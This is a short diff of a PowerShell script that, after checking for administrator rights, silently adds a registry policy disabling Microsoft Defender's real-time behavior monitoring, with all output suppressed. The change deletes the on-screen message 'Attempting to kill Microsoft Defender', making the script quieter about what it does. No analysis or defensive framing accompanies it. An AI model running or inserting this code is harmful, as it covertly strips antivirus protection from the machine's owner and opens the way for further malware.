@@ -3,8 +3,6 @@ function IsAdmin {
     return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-Write-Host "Attempting to kill Microsoft Defender ..."
-
 if (IsAdmin) {
     # Run the registry commands silently
     cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >$null 2>&1
